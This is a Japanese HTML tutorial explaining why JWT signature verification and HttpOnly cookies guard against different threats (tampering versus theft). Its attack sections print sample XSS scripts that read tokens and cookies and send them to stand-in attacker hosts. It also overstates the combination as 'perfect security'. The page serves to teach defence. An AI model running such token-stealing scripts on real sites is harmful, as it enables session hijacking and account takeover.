<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔐 JWT署名 vs HttpOnly Cookie：なぜ両方必要？セキュリティレイヤー完全解説</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
        }
        h1 {
            color: #2c3e50;
            text-align: center;
            border-bottom: 4px solid #667eea;
            padding-bottom: 15px;
            margin-bottom: 30px;
            font-size: 2.2em;
        }
        h2 {
            color: #34495e;
            border-left: 5px solid #667eea;
            padding-left: 20px;
            margin-top: 40px;
            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
            padding: 15px 20px;
            border-radius: 10px;
        }
        .question-box {
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
            color: white;
            padding: 25px;
            border-radius: 15px;
            margin: 25px 0;
            text-align: center;
        }
        .question-box h3 {
            margin-top: 0;
            font-size: 1.3em;
        }
        .security-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
            gap: 25px;
            margin: 30px 0;
        }
        .security-card {
            padding: 25px;
            border-radius: 15px;
            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
            transition: transform 0.3s ease;
        }
        .security-card:hover {
            transform: translateY(-5px);
        }
        .jwt-signature {
            background: linear-gradient(135deg, #3B82F6 0%, #2563EB 100%);
            color: white;
        }
        .httponly-protection {
            background: linear-gradient(135deg, #10B981 0%, #059669 100%);
            color: white;
        }
        .security-card h3 {
            margin-top: 0;
            font-size: 1.4em;
            text-align: center;
            border-bottom: 2px solid rgba(255,255,255,0.3);
            padding-bottom: 10px;
        }
        .code-block {
            background: #2d3748;
            color: #e2e8f0;
            padding: 20px;
            border-radius: 10px;
            font-family: 'Monaco', 'Courier New', monospace;
            font-size: 14px;
            overflow-x: auto;
            margin: 15px 0;
            line-height: 1.4;
            border: 2px solid #4a5568;
        }
        .code-block.success {
            border: 2px solid #10B981;
        }
        .code-block.error {
            border: 2px solid #ff6b6b;
        }
        .code-block.warning {
            border: 2px solid #ffa726;
        }
        .attack-scenario {
            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
            padding: 30px;
            border-radius: 15px;
            margin: 25px 0;
            border: 2px solid #ff6b6b;
        }
        .attack-scenario h3 {
            color: #dc2626;
            margin-top: 0;
        }
        .defense-comparison {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 25px;
            margin: 25px 0;
        }
        .attack-type {
            padding: 25px;
            border-radius: 15px;
            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
        }
        .tampering-attack {
            background: linear-gradient(135deg, #3B82F6 0%, #2563EB 100%);
            color: white;
        }
        .theft-attack {
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
            color: white;
        }
        .security-matrix {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            background: white;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        .security-matrix th {
            background: #667eea;
            color: white;
            padding: 15px;
            text-align: center;
        }
        .security-matrix td {
            padding: 15px;
            text-align: center;
            border-bottom: 1px solid #e5e7eb;
        }
        .protected {
            background: #dcfce7;
            color: #166534;
            font-weight: bold;
        }
        .vulnerable {
            background: #fee2e2;
            color: #991b1b;
            font-weight: bold;
        }
        .safe {
            background: #dbeafe;
            color: #1e40af;
            font-weight: bold;
        }
        .highlight-box {
            background: #fff3cd;
            border: 2px solid #ffc107;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
        }
        .conclusion-box {
            background: linear-gradient(135deg, #10B981 0%, #059669 100%);
            color: white;
            padding: 25px;
            border-radius: 15px;
            margin: 25px 0;
        }
        .conclusion-box h3 {
            margin-top: 0;
            text-align: center;
        }
        .layer-diagram {
            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
            padding: 30px;
            border-radius: 15px;
            margin: 25px 0;
            text-align: center;
            border: 2px solid #667eea;
        }
        .layer {
            background: white;
            padding: 20px;
            margin: 15px auto;
            border-radius: 10px;
            max-width: 400px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            position: relative;
        }
        .layer.jwt {
            border-left: 5px solid #3B82F6;
        }
        .layer.httponly {
            border-left: 5px solid #10B981;
        }
        .arrow-down {
            font-size: 24px;
            color: #667eea;
            margin: 10px 0;
        }
        .xss-example {
            background: #fee2e2;
            border: 2px solid #dc2626;
            padding: 25px;
            border-radius: 15px;
            margin: 25px 0;
        }
        .xss-example h3 {
            color: #dc2626;
            margin-top: 0;
        }
        @media (max-width: 768px) {
            .security-grid,
            .defense-comparison {
                grid-template-columns: 1fr;
            }
            .container {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 JWT署名 vs HttpOnly Cookie<br>なぜ両方必要？セキュリティレイヤー完全解説</h1>

        <div class="question-box">
            <h3>🤔 素朴な疑問</h3>
            <p><strong>「JWTって改ざんしたらすぐバレるようになってるのに、<br>どうしてそれをHttpOnlyにする必要があるの？<br>HttpOnlyにしなくても改竄したらすぐバレるじゃん。」</strong></p>
        </div>

        <h2>🎯 JWT署名 vs HttpOnly の役割分担</h2>

        <div class="security-grid">
            <div class="security-card jwt-signature">
                <h3>🔒 JWT署名が防げるもの</h3>
                <ul>
                    <li><strong>✅ 改ざん検知</strong>：トークン内容の変更を検出</li>
                    <li><strong>✅ 偽造防止</strong>：秘密鍵なしでは有効なJWT作成不可</li>
                    <li><strong>✅ データ完全性</strong>：トークンが正規かどうか確認</li>
                    <li><strong>✅ 認証局証明</strong>：正規サーバーが発行したことを証明</li>
                </ul>
                <div class="code-block success">
// JWT署名検証（Laravel側）
$verifiedToken = $firebaseAuth->verifyIdToken($jwt);
// ✅ 署名が正しければ通る
// ❌ 改ざんされていれば例外発生
                </div>
            </div>

            <div class="security-card httponly-protection">
                <h3>🛡️ HttpOnlyが防げるもの</h3>
                <ul>
                    <li><strong>✅ XSS盗難防止</strong>：JavaScriptからの読み取り不可</li>
                    <li><strong>✅ CSRF攻撃防御</strong>：SameSite属性との組み合わせ</li>
                    <li><strong>✅ アクセス制御</strong>：ブラウザ内蔵機能による保護</li>
                    <li><strong>✅ 自動管理</strong>：有効期限・送信タイミングを制御</li>
                </ul>
                <div class="code-block success">
// HttpOnly Cookie設定
setCookie(event, 'auth_jwt', jwt, {
  httpOnly: true,  // ✅ JavaScript完全遮断
  secure: true,    // ✅ HTTPS必須
  sameSite: 'lax'  // ✅ CSRF防御
})
                </div>
            </div>
        </div>

        <h2>🚨 JWT署名が防げない脅威</h2>

        <div class="highlight-box">
            <h3>⚠️ 重要な理解</h3>
            <p><strong>JWT署名は「改ざん」は防げるが「盗難」は防げない！</strong></p>
            <p>正規のJWTをそのまま盗んで悪用されたら、署名は完璧でも攻撃が成功してしまいます。</p>
        </div>

        <div class="defense-comparison">
            <div class="attack-type tampering-attack">
                <h3>🔒 改ざん攻撃（JWT署名で防御済み）</h3>
                <div class="code-block error">
// ❌ これは失敗する（署名不一致でLaravel側が拒否）
const stolenJWT = "eyJhbGciOiJSUzI1NiIs..."
const fakeJWT = stolenJWT.replace('user_id:123', 'user_id:999')

// Laravel側での検証
$verifiedToken = $auth->verifyIdToken($fakeJWT)
// → Exception: "Invalid signature" エラー
                </div>
                <p><strong>結果：✅ 攻撃失敗（JWT署名が防御）</strong></p>
            </div>

            <div class="attack-type theft-attack">
                <h3>🚨 盗難攻撃（HttpOnlyで防ぐ必要あり）</h3>
                <div class="code-block warning">
// ✅ これは成功してしまう（正規JWTをそのまま使用）
const stolenJWT = localStorage.getItem('jwt') // XSSで盗難
fetch('https://evil-site.com/steal', {
  method: 'POST',
  body: { token: stolenJWT } // 攻撃者に送信
})

// 攻撃者が別の場所から正規JWTを使用
fetch('https://your-api.com/posts', {
  headers: { 'Authorization': `Bearer ${stolenJWT}` }
})
// → Laravel: "Valid signature" ✅ 通ってしまう！
                </div>
                <p><strong>結果：❌ 攻撃成功（JWT署名では防げない）</strong></p>
            </div>
        </div>

        <h2>💀 現実的なXSS攻撃シナリオ</h2>

        <div class="xss-example">
            <h3>🎯 XSS攻撃例：悪意あるスクリプトが注入された場合</h3>
            <div class="code-block error">
// サイトに注入された悪意あるスクリプト
&lt;script&gt;
// JWT署名は完璧でも...
const jwt = localStorage.getItem('auth_token') // 読み取り可能
const userData = document.cookie // 読み取り可能
const sensitiveData = {
  jwt: jwt,
  cookies: userData,
  location: window.location.href,
  userAgent: navigator.userAgent
}

// 攻撃者のサーバーに送信
fetch('https://attacker.com/collect', {
  method: 'POST',  
  body: JSON.stringify(sensitiveData)
})

// 攻撃者は盗んだ正規JWTでAPI呼び出し可能
// なりすまして投稿作成、削除、個人情報取得など
&lt;/script&gt;
            </div>
            <p><strong>この攻撃では、JWTの署名は完璧でも関係なし。正規のトークンをそのまま盗まれているため！</strong></p>
        </div>

        <h2>📊 セキュリティ防御マトリックス</h2>

        <table class="security-matrix">
            <thead>
                <tr>
                    <th>攻撃タイプ</th>
                    <th>🔒 JWT署名</th>
                    <th>🛡️ HttpOnly</th>
                    <th>最終結果</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td><strong>改ざん攻撃</strong></td>
                    <td class="protected">✅ 防御</td>
                    <td>-</td>
                    <td class="safe">🛡️ 安全</td>
                </tr>
                <tr>
                    <td><strong>偽造攻撃</strong></td>
                    <td class="protected">✅ 防御</td>
                    <td>-</td>
                    <td class="safe">🛡️ 安全</td>
                </tr>
                <tr>
                    <td><strong>XSS盗難</strong></td>
                    <td class="vulnerable">❌ 無効</td>
                    <td class="protected">✅ 防御</td>
                    <td class="safe">🛡️ 安全</td>
                </tr>
                <tr>
                    <td><strong>CSRF攻撃</strong></td>
                    <td class="vulnerable">❌ 無効</td>
                    <td class="protected">✅ 防御</td>
                    <td class="safe">🛡️ 安全</td>
                </tr>
                <tr>
                    <td><strong>ネットワーク盗聴</strong></td>
                    <td class="vulnerable">❌ 無効</td>
                    <td class="protected">✅ 防御 (Secure)</td>
                    <td class="safe">🛡️ 安全</td>
                </tr>
            </tbody>
        </table>

        <h2>🏗️ セキュリティレイヤーの概念</h2>

        <div class="layer-diagram">
            <h3>🛡️ 多層防御アーキテクチャ</h3>
            
            <div class="layer jwt">
                <h4>🔒 JWT署名レイヤー</h4>
                <p><strong>役割：「このトークンは本物だ」</strong></p>
                <ul>
                    <li>データの真正性保証</li>
                    <li>改ざん・偽造の検知</li>
                    <li>発行者の証明</li>
                </ul>
            </div>
            
            <div class="arrow-down">⬇️</div>
            
            <div class="layer httponly">
                <h4>🛡️ HttpOnlyレイヤー</h4>
                <p><strong>役割：「でも悪い人には渡さない」</strong></p>
                <ul>
                    <li>アクセス権限制御</li>
                    <li>XSS攻撃からの保護</li>
                    <li>自動セキュリティ管理</li>
                </ul>
            </div>
            
            <div class="arrow-down">⬇️</div>
            
            <div style="background: linear-gradient(135deg, #10B981 0%, #059669 100%); color: white; padding: 20px; border-radius: 10px; margin-top: 20px;">
                <h4>🏆 結果：完璧なセキュリティ</h4>
                <p>真正性 + アクセス制御 = 最強防御</p>
            </div>
        </div>

        <h2>💡 なぜ両方必要なのか？</h2>

        <div class="attack-scenario">
            <h3>🔍 具体的なセキュリティホールの例</h3>
            
            <h4>🚨 JWT署名のみの場合（HttpOnlyなし）</h4>
            <div class="code-block error">
// localStorage にJWT保存（危険）
localStorage.setItem('jwt', validJwtToken)

// XSS攻撃でJWT盗難
const stolenJWT = localStorage.getItem('jwt')

// JWT署名は完璧だが、盗まれたら意味なし
fetch('/api/posts', {
  headers: { 'Authorization': `Bearer ${stolenJWT}` }
})
// ✅ Laravel: "Valid signature" → 攻撃成功
            </div>
            
            <h4>🛡️ HttpOnly追加後</h4>
            <div class="code-block success">
// HttpOnly Cookie（安全）
// JavaScript からアクセス不可

// XSS攻撃を試行
const jwt = document.cookie // auth_jwt は見えない
const jwt2 = localStorage.getItem('jwt') // 保存されていない

// 攻撃者は手出しできない
console.log(jwt) // undefined
// ✅ 攻撃失敗
            </div>
        </div>

        <h2>🎯 セキュリティの本質</h2>

        <div class="conclusion-box">
            <h3>💎 JWT署名 + HttpOnly = 理想的な多層防御</h3>
            
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0;">
                <div>
                    <h4>🔒 JWT署名の役割</h4>
                    <ul>
                        <li><strong>データ完全性</strong>：改ざん検知</li>
                        <li><strong>認証局証明</strong>：発行者確認</li>
                        <li><strong>暗号学的安全性</strong>：偽造防止</li>
                    </ul>
                </div>
                <div>
                    <h4>🛡️ HttpOnlyの役割</h4>
                    <ul>
                        <li><strong>アクセス制御</strong>：読み取り権限管理</li>
                        <li><strong>XSS防御</strong>：JavaScript遮断</li>
                        <li><strong>自動保護</strong>：ブラウザレベル制御</li>
                    </ul>
                </div>
            </div>

            <div style="text-align: center; margin-top: 25px; font-size: 1.2em; padding: 20px; background: rgba(255,255,255,0.1); border-radius: 10px;">
                <strong>🏆 結論</strong><br>
                <strong>JWT署名：「このトークンは本物だ」</strong><br>
                <strong>HttpOnly：「でも悪い人には渡さない」</strong><br><br>
                <em>両方とも異なるセキュリティレイヤーで、両方必要！</em>
            </div>
        </div>

        <h2>🚀 実世界での例え</h2>

        <div class="highlight-box">
            <h3>🏦 銀行カードの例え</h3>
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
                <div>
                    <h4>🔒 チップ（JWT署名相当）</h4>
                    <ul>
                        <li>偽造防止機能</li>
                        <li>改ざん検知</li>
                        <li>正規カードの証明</li>
                    </ul>
                    <p><strong>でも：盗まれたら正規カードとして使われる！</strong></p>
                </div>
                <div>
                    <h4>🛡️ 金庫保管（HttpOnly相当）</h4>
                    <ul>
                        <li>物理的アクセス制御</li>
                        <li>盗難からの保護</li>
                        <li>自動セキュリティ</li>
                    </ul>
                    <p><strong>結果：チップ + 金庫 = 完璧な保護</strong></p>
                </div>
            </div>
        </div>

        <div style="text-align: center; margin-top: 50px; padding: 30px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border-radius: 15px;">
            <h3>🎉 JWT署名とHttpOnly Cookieの完璧な組み合わせ</h3>
            <p style="font-size: 1.1em; margin: 15px 0;">
                <strong>真正性保証 + アクセス制御 = 世界最高水準のセキュリティ</strong><br>
                <strong>JWTがどんなに完璧でも、盗まれたら終わり</strong><br>
                <strong>だから「盗まれないようにする仕組み」がHttpOnly</strong>
            </p>
            <div style="margin-top: 20px; font-size: 0.9em; opacity: 0.9;">
                🔒 Integrity + 🛡️ Access Control = 🏆 Perfect Security
            </div>
        </div>
    </div>
</body>
</html>